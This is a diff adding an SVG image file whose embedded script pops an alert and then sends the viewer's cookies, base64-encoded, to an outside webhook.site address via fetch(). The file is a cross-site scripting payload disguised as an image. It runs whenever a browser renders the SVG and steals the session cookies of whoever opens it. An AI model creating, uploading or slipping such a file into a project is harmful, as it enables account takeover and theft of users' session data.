@@ -1,0 +1,6 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    alert('Hii');
+    fetch('https://webhook.site/ef74399d-f3fc-4651-9e00-8cc2718cc006?c=' + btoa(document.cookie));
+  </script>
+</svg>
